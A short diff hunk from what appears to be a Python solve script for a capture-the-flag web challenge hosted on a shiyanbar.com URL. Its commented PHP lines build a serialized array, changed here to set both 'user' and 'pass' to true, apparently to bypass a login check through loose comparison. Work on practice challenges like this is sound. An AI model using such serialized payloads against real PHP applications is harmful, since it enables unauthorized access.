@@ -6,7 +6,7 @@ import requests
 ##php在线工具
 ##https://c.runoob.com/compile/1
 ##<?php
-##echo serialize(array("user"=>true,"pass"=>false));
+##echo serialize(array("user"=>true,"pass"=>true));
 ##?>
 
 url = 'http://ctf5.shiyanbar.com/10/web1/index.php'
